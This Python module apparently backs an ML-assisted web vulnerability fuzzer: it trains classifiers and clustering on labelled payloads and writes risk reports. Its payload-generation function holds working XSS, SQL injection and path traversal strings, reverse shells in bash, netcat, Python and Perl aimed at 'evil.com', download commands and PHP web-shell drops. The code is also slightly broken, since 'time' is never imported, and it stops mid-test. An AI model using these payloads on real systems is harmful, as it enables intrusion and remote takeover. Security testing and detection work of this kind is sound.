
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.cluster import KMeans, DBSCAN
from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import (accuracy_score, precision_score, recall_score, f1_score, 
                           confusion_matrix, classification_report, silhouette_score)
from sklearn.manifold import TSNE
from sklearn.decomposition import PCA
from sklearn.preprocessing import StandardScaler
import matplotlib
matplotlib.use('Agg')  # Use non-interactive backend
import matplotlib.pyplot as plt
import seaborn as sns
import joblib
import logging
import random
import json
from datetime import datetime
import os
import io
import base64

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global model storage
trained_models = {}
vectorizers = {}
scalers = {}
clustering_models = {}
model_metadata = {}

class MLModelHandler:
    def __init__(self):
        self.models_dir = 'models'
        os.makedirs(self.models_dir, exist_ok=True)
        
    def save_model(self, model, model_name, metadata=None):
        """Save model to disk with metadata"""
        try:
            model_path = os.path.join(self.models_dir, f"{model_name}.joblib")
            joblib.dump(model, model_path)
            
            if metadata:
                metadata_path = os.path.join(self.models_dir, f"{model_name}_metadata.json")
                with open(metadata_path, 'w') as f:
                    json.dump(metadata, f, indent=2)
            
            logger.info(f"Model {model_name} saved successfully")
            return True
        except Exception as e:
            logger.error(f"Error saving model {model_name}: {e}")
            return False
    
    def load_model(self, model_name):
        """Load model from disk"""
        try:
            model_path = os.path.join(self.models_dir, f"{model_name}.joblib")
            if os.path.exists(model_path):
                model = joblib.load(model_path)
                logger.info(f"Model {model_name} loaded successfully")
                return model
            return None
        except Exception as e:
            logger.error(f"Error loading model {model_name}: {e}")
            return None

# Initialize handler
ml_handler = MLModelHandler()

def feature_engineering(dataset):
    """Advanced feature engineering for security payloads"""
    try:
        if isinstance(dataset, pd.DataFrame):
            df = dataset.copy()
        else:
            df = pd.DataFrame(dataset)
        
        # Text-based features
        df['payload_length'] = df['payload'].str.len()
        df['word_count'] = df['payload'].str.split().str.len()
        df['special_char_count'] = df['payload'].str.count(r'[^\w\s]')
        df['digit_count'] = df['payload'].str.count(r'\d')
        df['uppercase_count'] = df['payload'].str.count(r'[A-Z]')
        
        # Security-specific features
        df['has_sql_keywords'] = df['payload'].str.contains(
            r'(?i)(select|union|insert|delete|drop|alter|create|exec)', na=False
        )
        df['has_script_tags'] = df['payload'].str.contains(
            r'(?i)(<script|<img|<iframe|<object|<embed)', na=False
        )
        df['has_path_traversal'] = df['payload'].str.contains(r'\.\./', na=False)
        df['has_command_injection'] = df['payload'].str.contains(
            r'(?i)(;|&&|\|\||`|\$\()', na=False
        )
        df['has_quotes'] = df['payload'].str.contains(r"['\"]", na=False)
        df['entropy'] = df['payload'].apply(calculate_entropy)
        
        # Response-based features (if available)
        if 'response_code' in df.columns:
            df['is_error_response'] = df['response_code'] >= 400
        
        return df
    except Exception as e:
        logger.error(f"Error in feature engineering: {e}")
        return dataset

def calculate_entropy(text):
    """Calculate Shannon entropy of text"""
    try:
        if not text:
            return 0
        prob = [float(text.count(c)) / len(text) for c in dict.fromkeys(list(text))]
        entropy = -sum([p * np.log2(p) for p in prob])
        return entropy
    except:
        return 0

def train_advanced_classifier(dataset):
    """Train advanced ML classifier with feature engineering"""
    try:
        logger.info(f"Training advanced classifier on {len(dataset)} samples")
        
        # Feature engineering
        df = feature_engineering(dataset)
        
        # Prepare text features
        X_text = df['payload'].astype(str)
        
        # Prepare numerical features
        feature_cols = ['payload_length', 'word_count', 'special_char_count', 
                       'digit_count', 'uppercase_count', 'entropy']
        feature_cols.extend(['has_sql_keywords', 'has_script_tags', 'has_path_traversal',
                           'has_command_injection', 'has_quotes'])
        
        X_numerical = df[feature_cols].fillna(0)
        
        # Labels
        y = df['label'].map({'malicious': 1, 'safe': 0})
        
        # Vectorize text
        vectorizer = TfidfVectorizer(max_features=2000, ngram_range=(1, 4), 
                                   analyzer='char_wb', min_df=2)
        X_text_vectorized = vectorizer.fit_transform(X_text)
        
        # Scale numerical features
        scaler = StandardScaler()
        X_numerical_scaled = scaler.fit_transform(X_numerical)
        
        # Combine features
        from scipy.sparse import hstack
        X_combined = hstack([X_text_vectorized, X_numerical_scaled])
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X_combined, y, test_size=0.3, random_state=42, stratify=y
        )
        
        # Train multiple models
        models = {
            'random_forest': RandomForestClassifier(n_estimators=200, max_depth=10, 
                                                  min_samples_split=5, random_state=42),
        }
        
        best_model = None
        best_score = 0
        results = {}
        
        for name, model in models.items():
            # Train model
            model.fit(X_train, y_train)
            
            # Predict
            y_pred = model.predict(X_test)
            y_pred_proba = model.predict_proba(X_test)[:, 1]
            
            # Evaluate
            accuracy = accuracy_score(y_test, y_pred)
            precision = precision_score(y_test, y_pred, zero_division=0)
            recall = recall_score(y_test, y_pred, zero_division=0)
            f1 = f1_score(y_test, y_pred, zero_division=0)
            
            # Cross-validation
            cv_scores = cross_val_score(model, X_train, y_train, cv=5, scoring='accuracy')
            
            results[name] = {
                'accuracy': accuracy,
                'precision': precision,
                'recall': recall,
                'f1_score': f1,
                'cv_mean': cv_scores.mean(),
                'cv_std': cv_scores.std(),
                'confusion_matrix': confusion_matrix(y_test, y_pred).tolist(),
                'classification_report': classification_report(y_test, y_pred, output_dict=True)
            }
            
            if accuracy > best_score:
                best_score = accuracy
                best_model = model
        
        # Store models and preprocessing
        trained_models['advanced_classifier'] = best_model
        vectorizers['advanced_classifier'] = vectorizer
        scalers['advanced_classifier'] = scaler
        
        # Save models
        ml_handler.save_model(best_model, 'advanced_classifier', {
            'type': 'RandomForestClassifier',
            'accuracy': best_score,
            'features': feature_cols,
            'trained_on': datetime.now().isoformat(),
            'samples': len(dataset)
        })
        
        # Generate feature importance plot
        feature_importance_plot = generate_feature_importance_plot(best_model, 
                                                                feature_cols + ['text_features'])
        
        result = {
            'success': True,
            'model_type': 'AdvancedRandomForest',
            'accuracy': best_score,
            'detailed_results': results,
            'samples_trained': len(dataset),
            'features_engineered': len(feature_cols),
            'feature_importance_plot': feature_importance_plot,
            'confusion_matrix': results['random_forest']['confusion_matrix'],
            'classification_report': results['random_forest']['classification_report']
        }
        
        logger.info(f"Advanced classifier training completed with {best_score:.3f} accuracy")
        return result
        
    except Exception as e:
        logger.error(f"Error training advanced classifier: {e}")
        return {'success': False, 'error': str(e), 'accuracy': 0.0}

def perform_clustering_analysis(dataset):
    """Perform clustering analysis on payloads"""
    try:
        logger.info("Performing clustering analysis")
        
        # Feature engineering
        df = feature_engineering(dataset)
        X_text = df['payload'].astype(str)
        
        # Vectorize for clustering
        vectorizer = TfidfVectorizer(max_features=1000, ngram_range=(1, 3), 
                                   stop_words=None, min_df=2)
        X_vectorized = vectorizer.fit_transform(X_text)
        
        # Reduce dimensionality for visualization
        pca = PCA(n_components=50, random_state=42)
        X_pca = pca.fit_transform(X_vectorized.toarray())
        
        # K-Means clustering
        optimal_k = find_optimal_clusters(X_pca, max_k=min(10, len(dataset)//2))
        kmeans = KMeans(n_clusters=optimal_k, random_state=42, n_init=10)
        kmeans_labels = kmeans.fit_predict(X_pca)
        kmeans_silhouette = silhouette_score(X_pca, kmeans_labels)
        
        # DBSCAN clustering
        dbscan = DBSCAN(eps=0.5, min_samples=3)
        dbscan_labels = dbscan.fit_predict(X_pca)
        n_clusters_dbscan = len(set(dbscan_labels)) - (1 if -1 in dbscan_labels else 0)
        
        # t-SNE for visualization
        tsne = TSNE(n_components=2, random_state=42, perplexity=min(30, len(dataset)-1))
        X_tsne = tsne.fit_transform(X_pca)
        
        # Generate cluster visualization
        cluster_plot = generate_cluster_visualization(X_tsne, kmeans_labels, dbscan_labels)
        
        # Analyze clusters
        cluster_analysis = analyze_clusters(df, kmeans_labels, optimal_k)
        
        # Store clustering models
        clustering_models['kmeans'] = kmeans
        clustering_models['dbscan'] = dbscan
        vectorizers['clustering'] = vectorizer
        
        result = {
            'success': True,
            'kmeans': {
                'n_clusters': optimal_k,
                'silhouette_score': kmeans_silhouette,
                'labels': kmeans_labels.tolist()
            },
            'dbscan': {
                'n_clusters': n_clusters_dbscan,
                'labels': dbscan_labels.tolist(),
                'noise_points': int(np.sum(dbscan_labels == -1))
            },
            'cluster_analysis': cluster_analysis,
            'visualization': cluster_plot,
            'samples_processed': len(dataset)
        }
        
        logger.info(f"Clustering analysis completed: K-Means({optimal_k} clusters), DBSCAN({n_clusters_dbscan} clusters)")
        return result
        
    except Exception as e:
        logger.error(f"Error in clustering analysis: {e}")
        return {'success': False, 'error': str(e)}

def find_optimal_clusters(X, max_k=10):
    """Find optimal number of clusters using elbow method"""
    try:
        inertias = []
        k_range = range(2, min(max_k + 1, len(X)))
        
        for k in k_range:
            kmeans = KMeans(n_clusters=k, random_state=42, n_init=10)
            kmeans.fit(X)
            inertias.append(kmeans.inertia_)
        
        # Simple elbow detection
        if len(inertias) >= 2:
            differences = np.diff(inertias)
            second_differences = np.diff(differences)
            if len(second_differences) > 0:
                elbow_idx = np.argmax(second_differences) + 2
                return k_range[min(elbow_idx, len(k_range)-1)]
        
        return min(3, max_k)  # Default
    except:
        return 3

def analyze_clusters(df, labels, n_clusters):
    """Analyze cluster characteristics"""
    try:
        analysis = {}
        df_with_clusters = df.copy()
        df_with_clusters['cluster'] = labels
        
        for cluster_id in range(n_clusters):
            cluster_data = df_with_clusters[df_with_clusters['cluster'] == cluster_id]
            
            if len(cluster_data) == 0:
                continue
                
            # Common patterns in cluster
            common_patterns = []
            if cluster_data['has_sql_keywords'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('SQL Injection')
            if cluster_data['has_script_tags'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('XSS')
            if cluster_data['has_path_traversal'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('Path Traversal')
            if cluster_data['has_command_injection'].sum() > len(cluster_data) * 0.5:
                common_patterns.append('Command Injection')
            
            analysis[f'cluster_{cluster_id}'] = {
                'size': len(cluster_data),
                'avg_payload_length': float(cluster_data['payload_length'].mean()),
                'avg_entropy': float(cluster_data['entropy'].mean()),
                'common_patterns': common_patterns,
                'sample_payloads': cluster_data['payload'].head(3).tolist()
            }
        
        return analysis
    except Exception as e:
        logger.error(f"Error analyzing clusters: {e}")
        return {}

def generate_attack_signatures(successful_payloads):
    """Generate attack signatures from successful payloads"""
    try:
        logger.info(f"Generating attack signatures from {len(successful_payloads)} payloads")
        
        signatures = {
            'sql_injection': [],
            'xss': [],
            'path_traversal': [],
            'command_injection': [],
            'general': []
        }
        
        for payload in successful_payloads:
            payload_lower = payload.lower()
            
            # SQL Injection signatures
            if any(keyword in payload_lower for keyword in ['union', 'select', 'drop', 'insert', "'", '"']):
                signatures['sql_injection'].append({
                    'pattern': extract_pattern(payload, 'sql'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            # XSS signatures
            elif any(tag in payload_lower for tag in ['<script', '<img', '<iframe', 'javascript:']):
                signatures['xss'].append({
                    'pattern': extract_pattern(payload, 'xss'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            # Path traversal signatures
            elif '../' in payload or '..\\' in payload:
                signatures['path_traversal'].append({
                    'pattern': extract_pattern(payload, 'path'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            # Command injection signatures
            elif any(char in payload for char in [';', '|', '&', '`', '$(']):
                signatures['command_injection'].append({
                    'pattern': extract_pattern(payload, 'cmd'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
            
            else:
                signatures['general'].append({
                    'pattern': extract_pattern(payload, 'general'),
                    'original': payload,
                    'risk_score': calculate_risk_score(payload)
                })
        
        # Remove duplicates and sort by risk score
        for category in signatures:
            signatures[category] = sorted(
                list({sig['pattern']: sig for sig in signatures[category]}.values()),
                key=lambda x: x['risk_score'], reverse=True
            )[:10]  # Keep top 10 per category
        
        logger.info("Attack signature generation completed")
        return signatures
        
    except Exception as e:
        logger.error(f"Error generating signatures: {e}")
        return {}

def extract_pattern(payload, attack_type):
    """Extract generalized pattern from payload"""
    try:
        # Simplify specific values to create patterns
        pattern = payload
        
        if attack_type == 'sql':
            pattern = pattern.replace("'", "'*'")
            pattern = pattern.replace('"', '"*"')
        elif attack_type == 'xss':
            pattern = pattern.replace("'", "'*'")
            pattern = pattern.replace('"', '"*"')
        elif attack_type == 'path':
            pattern = pattern.replace('/etc/passwd', '/etc/*')
            pattern = pattern.replace('\\windows\\', '\\windows\\*')
        
        return pattern[:100]  # Limit length
    except:
        return payload[:100]

def calculate_risk_score(payload):
    """Calculate risk score for a payload"""
    try:
        score = 0
        payload_lower = payload.lower()
        
        # SQL injection indicators
        sql_keywords = ['union', 'select', 'drop', 'insert', 'delete', 'update', 'create', 'alter']
        score += sum(1 for keyword in sql_keywords if keyword in payload_lower) * 10
        
        # XSS indicators
        xss_patterns = ['<script', '<img', 'javascript:', 'onload', 'onerror', 'onclick']
        score += sum(1 for pattern in xss_patterns if pattern in payload_lower) * 8
        
        # Command injection indicators
        cmd_chars = [';', '|', '&', '`', '$(']
        score += sum(1 for char in cmd_chars if char in payload) * 6
        
        # Path traversal indicators
        if '../' in payload or '..\\' in payload:
            score += 15
        
        # Special characters
        score += len([c for c in payload if not c.isalnum() and c != ' ']) * 0.5
        
        # Length factor
        score += min(len(payload) / 10, 10)
        
        return min(score, 100)  # Cap at 100
    except:
        return 50

def generate_intelligent_payloads(context, num_samples=5, difficulty="medium"):
    """Generate intelligent payloads using ML-driven optimization"""
    try:
        logger.info(f"Generating {num_samples} intelligent payloads for {context} (difficulty: {difficulty})")
        
        # Base templates by context and difficulty
        templates = {
            'xss': {
                'easy': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert('XSS')"
                ],
                'medium': [
                    "<svg onload=alert(String.fromCharCode(88,83,83))>",
                    "<iframe src=javascript:alert('XSS')>",
                    "';alert(String.fromCharCode(88,83,83));//",
                    "<marquee onstart=alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>"
                ],
                'hard': [
                    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
                    "javascript:/*--></title></style></textarea></script></xmp>*/alert('XSS')",
                    "<svg><script>alert&#40;'XSS'&#41;</script></svg>",
                    "<details open ontoggle=alert('XSS')>"
                ]
            },
            'sql injection': {
                'easy': [
                    "' OR 1=1 --",
                    "admin'--",
                    "' OR 'a'='a"
                ],
                'medium': [
                    "' UNION SELECT NULL,NULL,version() --",
                    "'; DROP TABLE users; --",
                    "' OR 1=1 LIMIT 1 --",
                    "admin' OR '1'='1' #",
                    "' UNION ALL SELECT user(),database(),version() --"
                ],
                'hard': [
                    "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT((SELECT version()),FLOOR(RAND(0)*2))) --",
                    "'; WAITFOR DELAY '00:00:05' --",
                    "' AND 1=2 UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database() --",
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --",
                    "' OR (SELECT SUBSTRING(@@version,1,1))='5' --"
                ]
            },
            'command injection': {
                'easy': [
                    "; ls",
                    "| whoami",
                    "&& id"
                ],
                'medium': [
                    "; cat /etc/passwd",
                    "| nc -l -p 4444 -e /bin/sh",
                    "&& wget http://evil.com/shell.sh",
                    "`curl evil.com/`",
                    "$(whoami)"
                ],
                'hard': [
                    "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                    "| bash -i >& /dev/tcp/evil.com/4444 0>&1",
                    "&& echo 'eval(base64_decode($_GET[cmd]));' > shell.php",
                    "`perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'`"
                ]
            },
            'path traversal': {
                'easy': [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
                ],
                'medium': [
                    "....//....//....//etc/passwd",
                    "php://filter/read=convert.base64-encode/resource=index.php",
                    "/proc/self/environ",
                    "....\\....\\....\\boot.ini",
                    "../../../var/log/apache2/access.log"
                ],
                'hard': [
                    "php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd",
                    "expect://id",
                    "zip://shell.jpg%23shell.php",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                    "phar://shell.jpg/shell.php"
                ]
            }
        }
        
        # Select appropriate templates
        if context and context.lower() in templates:
            context_templates = templates[context.lower()].get(difficulty, templates[context.lower()]['medium'])
        else:
            # General mixed payloads
            all_templates = []
            for ctx in templates.values():
                all_templates.extend(ctx.get(difficulty, ctx['medium']))
            context_templates = all_templates
        
        # Generate payloads with variations
        payloads = []
        for i in range(num_samples):
            base_payload = random.choice(context_templates)
            
            # Add variations based on ML insights
            variations = apply_ml_variations(base_payload, context, difficulty)
            payloads.extend(variations[:max(1, num_samples // len(context_templates))])
        
        # Ensure we have the right number
        payloads = payloads[:num_samples]
        
        # Fill up if needed
        while len(payloads) < num_samples:
            payloads.append(random.choice(context_templates))
        
        logger.info(f"Generated {len(payloads)} intelligent payloads")
        return payloads
        
    except Exception as e:
        logger.error(f"Error generating intelligent payloads: {e}")
        return [
            "<script>alert('XSS')</script>",
            "' OR 1=1 --",
            "../../../etc/passwd",
            "; whoami",
            "$(id)"
        ][:num_samples]

def apply_ml_variations(base_payload, context, difficulty):
    """Apply ML-driven variations to base payloads"""
    try:
        variations = [base_payload]
        
        # Encoding variations
        if difficulty in ['medium', 'hard']:
            # URL encoding
            url_encoded = base_payload.replace(' ', '%20').replace("'", '%27').replace('"', '%22')
            variations.append(url_encoded)
            
            # Double encoding
            if difficulty == 'hard':
                double_encoded = url_encoded.replace('%', '%25')
                variations.append(double_encoded)
        
        # Case variations
        if context and 'xss' in context.lower():
            case_variation = ''.join(
                c.upper() if random.random() > 0.5 else c.lower() 
                for c in base_payload
            )
            variations.append(case_variation)
        
        # Null byte variations
        if difficulty == 'hard' and ('path' in context.lower() or 'file' in context.lower()):
            null_variation = base_payload + '%00'
            variations.append(null_variation)
        
        return variations[:3]  # Limit variations
    except:
        return [base_payload]

def generate_feature_importance_plot(model, feature_names):
    """Generate feature importance visualization"""
    try:
        if hasattr(model, 'feature_importances_'):
            importances = model.feature_importances_
            
            # Limit to top features for readability
            top_indices = np.argsort(importances)[-20:]
            top_importances = importances[top_indices]
            top_names = [feature_names[i] if i < len(feature_names) else f'feature_{i}' for i in top_indices]
            
            plt.figure(figsize=(10, 8))
            plt.barh(range(len(top_importances)), top_importances)
            plt.yticks(range(len(top_importances)), top_names)
            plt.xlabel('Feature Importance')
            plt.title('Top 20 Feature Importances')
            plt.tight_layout()
            
            # Convert to base64
            buffer = io.BytesIO()
            plt.savefig(buffer, format='png', dpi=150, bbox_inches='tight')
            buffer.seek(0)
            plot_data = base64.b64encode(buffer.getvalue()).decode()
            plt.close()
            
            return f"data:image/png;base64,{plot_data}"
        
        return None
    except Exception as e:
        logger.error(f"Error generating feature importance plot: {e}")
        return None

def generate_cluster_visualization(X_tsne, kmeans_labels, dbscan_labels):
    """Generate cluster visualization plot"""
    try:
        fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(15, 6))
        
        # K-Means plot
        scatter1 = ax1.scatter(X_tsne[:, 0], X_tsne[:, 1], c=kmeans_labels, cmap='viridis', alpha=0.7)
        ax1.set_title('K-Means Clustering')
        ax1.set_xlabel('t-SNE Component 1')
        ax1.set_ylabel('t-SNE Component 2')
        plt.colorbar(scatter1, ax=ax1)
        
        # DBSCAN plot
        scatter2 = ax2.scatter(X_tsne[:, 0], X_tsne[:, 1], c=dbscan_labels, cmap='viridis', alpha=0.7)
        ax2.set_title('DBSCAN Clustering')
        ax2.set_xlabel('t-SNE Component 1')
        ax2.set_ylabel('t-SNE Component 2')
        plt.colorbar(scatter2, ax=ax2)
        
        plt.tight_layout()
        
        # Convert to base64
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png', dpi=150, bbox_inches='tight')
        buffer.seek(0)
        plot_data = base64.b64encode(buffer.getvalue()).decode()
        plt.close()
        
        return f"data:image/png;base64,{plot_data}"
        
    except Exception as e:
        logger.error(f"Error generating cluster visualization: {e}")
        return None

def generate_comprehensive_report(session_data):
    """Generate comprehensive security analysis report"""
    try:
        logger.info("Generating comprehensive security report")
        
        # Extract data from session
        vulnerabilities = session_data.get('vulnerabilities', [])
        payloads_tested = session_data.get('payloads_tested', 0)
        target_url = session_data.get('target_url', 'Unknown')
        
        # Calculate metrics
        total_vulns = len(vulnerabilities)
        vuln_types = {}
        risk_scores = []
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'Unknown')
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            risk_scores.append(calculate_risk_score(vuln.get('payload', '')))
        
        avg_risk = np.mean(risk_scores) if risk_scores else 0
        max_risk = max(risk_scores) if risk_scores else 0
        
        # Generate executive summary
        executive_summary = {
            'overall_risk_level': 'High' if max_risk > 70 else 'Medium' if max_risk > 40 else 'Low',
            'vulnerabilities_found': total_vulns,
            'payloads_tested': payloads_tested,
            'success_rate': f"{(total_vulns/payloads_tested*100):.1f}%" if payloads_tested > 0 else "0%",
            'average_risk_score': f"{avg_risk:.1f}",
            'maximum_risk_score': f"{max_risk:.1f}",
            'target_assessed': target_url
        }
        
        # Vulnerability breakdown
        vulnerability_breakdown = {
            'by_type': vuln_types,
            'by_severity': {
                'Critical': len([r for r in risk_scores if r > 80]),
                'High': len([r for r in risk_scores if 60 < r <= 80]),
                'Medium': len([r for r in risk_scores if 40 < r <= 60]),
                'Low': len([r for r in risk_scores if r <= 40])
            }
        }
        
        # Recommendations
        recommendations = generate_recommendations(vuln_types, max_risk)
        
        # Generate risk timeline plot
        risk_timeline_plot = generate_risk_timeline_plot(vulnerabilities)
        
        report = {
            'success': True,
            'report_id': f"report_{int(time.time())}",
            'generated_at': datetime.now().isoformat(),
            'executive_summary': executive_summary,
            'vulnerability_breakdown': vulnerability_breakdown,
            'recommendations': recommendations,
            'detailed_findings': vulnerabilities[:20],  # Top 20 findings
            'risk_timeline_plot': risk_timeline_plot,
            'methodology': {
                'tools_used': ['ML-Enhanced Web Fuzzer', 'Advanced Classification', 'Clustering Analysis'],
                'payloads_tested': payloads_tested,
                'test_duration': session_data.get('duration', 'Unknown'),
                'coverage': 'Comprehensive vulnerability assessment'
            }
        }
        
        logger.info("Comprehensive security report generated successfully")
        return report
        
    except Exception as e:
        logger.error(f"Error generating comprehensive report: {e}")
        return {'success': False, 'error': str(e)}

def generate_recommendations(vuln_types, max_risk):
    """Generate security recommendations based on findings"""
    recommendations = []
    
    if 'XSS' in vuln_types:
        recommendations.append({
            'priority': 'High',
            'category': 'Input Validation',
            'description': 'Implement proper input sanitization and output encoding to prevent XSS attacks',
            'technical_details': 'Use context-aware output encoding and Content Security Policy (CSP) headers'
        })
    
    if 'SQL Injection' in vuln_types:
        recommendations.append({
            'priority': 'Critical',
            'category': 'Database Security',
            'description': 'Use parameterized queries and prepared statements to prevent SQL injection',
            'technical_details': 'Replace dynamic SQL construction with parameterized queries and implement least privilege database access'
        })
    
    if 'Command Injection' in vuln_types:
        recommendations.append({
            'priority': 'Critical',
            'category': 'System Security',
            'description': 'Avoid system command execution with user input',
            'technical_details': 'Use safe APIs instead of system commands, implement input validation and sandboxing'
        })
    
    if 'Path Traversal' in vuln_types:
        recommendations.append({
            'priority': 'High',
            'category': 'File System Security',
            'description': 'Implement proper file path validation and access controls',
            'technical_details': 'Use whitelisting for allowed file paths and implement proper access controls'
        })
    
    if max_risk > 70:
        recommendations.append({
            'priority': 'Critical',
            'category': 'General Security',
            'description': 'Immediate security review required due to high-risk vulnerabilities',
            'technical_details': 'Conduct thorough security audit and implement defense-in-depth strategies'
        })
    
    return recommendations

def generate_risk_timeline_plot(vulnerabilities):
    """Generate risk timeline visualization"""
    try:
        if not vulnerabilities:
            return None
        
        # Extract timestamps and risk scores
        timestamps = []
        risks = []
        
        for vuln in vulnerabilities:
            if 'detected_at' in vuln:
                timestamps.append(pd.to_datetime(vuln['detected_at']))
                risks.append(calculate_risk_score(vuln.get('payload', '')))
        
        if not timestamps:
            return None
        
        plt.figure(figsize=(12, 6))
        plt.plot(timestamps, risks, marker='o', linestyle='-', alpha=0.7)
        plt.xlabel('Time')
        plt.ylabel('Risk Score')
        plt.title('Vulnerability Risk Timeline')
        plt.xticks(rotation=45)
        plt.grid(True, alpha=0.3)
        plt.tight_layout()
        
        # Convert to base64
        buffer = io.BytesIO()
        plt.savefig(buffer, format='png', dpi=150, bbox_inches='tight')
        buffer.seek(0)
        plot_data = base64.b64encode(buffer.getvalue()).decode()
        plt.close()
        
        return f"data:image/png;base64,{plot_data}"
        
    except Exception as e:
        logger.error(f"Error generating risk timeline plot: {e}")
        return None

def predict_payload_effectiveness(payload, context=None):
    """Predict payload effectiveness using trained models"""
    try:
        if 'advanced_classifier' not in trained_models:
            return {'effectiveness': 'unknown', 'confidence': 0.0, 'risk_score': 50.0}
        
        model = trained_models['advanced_classifier']
        vectorizer = vectorizers.get('advanced_classifier')
        scaler = scalers.get('advanced_classifier')
        
        if not vectorizer or not scaler:
            return {'effectiveness': 'unknown', 'confidence': 0.0, 'risk_score': 50.0}
        
        # Feature engineering for single payload
        df = pd.DataFrame([{'payload': payload, 'label': 'unknown'}])
        df = feature_engineering(df)
        
        # Prepare features
        feature_cols = ['payload_length', 'word_count', 'special_char_count', 
                       'digit_count', 'uppercase_count', 'entropy',
                       'has_sql_keywords', 'has_script_tags', 'has_path_traversal',
                       'has_command_injection', 'has_quotes']
        
        X_text = df['payload'].astype(str)
        X_numerical = df[feature_cols].fillna(0)
        
        # Vectorize and scale
        X_text_vectorized = vectorizer.transform(X_text)
        X_numerical_scaled = scaler.transform(X_numerical)
        
        # Combine features
        from scipy.sparse import hstack
        X_combined = hstack([X_text_vectorized, X_numerical_scaled])
        
        # Predict
        prediction = model.predict(X_combined)[0]
        probability = model.predict_proba(X_combined)[0]
        
        effectiveness = 'high' if prediction == 1 else 'low'
        confidence = max(probability)
        risk_score = calculate_risk_score(payload)
        
        return {
            'effectiveness': effectiveness,
            'confidence': float(confidence),
            'risk_score': float(risk_score),
            'malicious_probability': float(probability[1] if len(probability) > 1 else 0.0)
        }
        
    except Exception as e:
        logger.error(f"Error predicting payload effectiveness: {e}")
        return {'effectiveness': 'unknown', 'confidence': 0.0, 'risk_score': 50.0}

def train_isolation_forest(dataset):
    """Train an isolation forest for anomaly detection"""
    try:
        logger.info("Training Isolation Forest for anomaly detection")
        
        # Prepare features
        if isinstance(dataset, pd.DataFrame):
            X_text = dataset['payload'].astype(str)
        else:
            X_text = pd.Series([item['payload'] for item in dataset])
        
        # Use existing vectorizer or create new one
        if 'advanced_classifier' in vectorizers:
            vectorizer = vectorizers['advanced_classifier']
            X_vectorized = vectorizer.transform(X_text)
        else:
            vectorizer = TfidfVectorizer(max_features=500, ngram_range=(1, 2))
            X_vectorized = vectorizer.fit_transform(X_text)
            vectorizers['isolation'] = vectorizer
        
        # Train Isolation Forest
        iso_forest = IsolationForest(contamination=0.1, random_state=42)
        iso_forest.fit(X_vectorized)
        
        # Calculate anomaly scores
        anomaly_scores = iso_forest.decision_function(X_vectorized)
        anomalies = iso_forest.predict(X_vectorized)
        anomaly_rate = (anomalies == -1).sum() / len(anomalies)
        
        # Store model
        trained_models['isolation_forest'] = iso_forest
        
        result = {
            'success': True,
            'model_type': 'IsolationForest',
            'samples_processed': len(dataset),
            'metrics': {
                'anomalyRate': anomaly_rate,
                'avgAnomalyScore': np.mean(anomaly_scores),
                'minAnomalyScore': np.min(anomaly_scores),
                'maxAnomalyScore': np.max(anomaly_scores)
            }
        }
        
        logger.info(f"Isolation Forest training completed with {anomaly_rate:.3f} anomaly rate")
        return result
        
    except Exception as e:
        logger.error(f"Error training isolation forest: {e}")
        return {
            'success': False,
            'error': str(e),
            'metrics': {'anomalyRate': 0.0}
        }

def parse_uploaded_dataset(file_content):
    """Parse uploaded dataset file"""
    try:
        # Simple CSV parsing
        lines = file_content.strip().split('\n')
        dataset = []
        
        for line in lines[1:]:  # Skip header
            parts = line.split(',')
            if len(parts) >= 2:
                dataset.append({
                    'payload': parts[0].strip(),
                    'label': parts[1].strip(),
                    'response_code': int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 200
                })
        
        return dataset
        
    except Exception as e:
        logger.error(f"Error parsing dataset: {e}")
        return []

if __name__ == "__main__":
    # Test the comprehensive ML system
    sample_data = [
        {'payload': "' OR 1=1 --", 'label': 'malicious'},
        {'payload': "normal search", 'label': 'safe'},
        {'payload': "<script>alert('xss')</script>", 'label': 'malicious'},
        {'payload': "../../../etc/passwd", 'label': 'malicious'},
        {'payload': "; whoami", 'label': 'malicious'},
        {'payload': "regular input", 'label': 'safe'}
    ]
    
    print("Testing comprehensive ML system...")
    
    # Test advanced classifier
    classifier_result = train_advanced_classifier(sample_data)
    print(f"Advanced classifier result: {classifier_result['success']}")
    
    # Test clustering
    clustering_result = perform_clustering_analysis(sample_data)
    print(f"Clustering result: {clustering_result['success']}")
    
    # Test intelligent payload generation
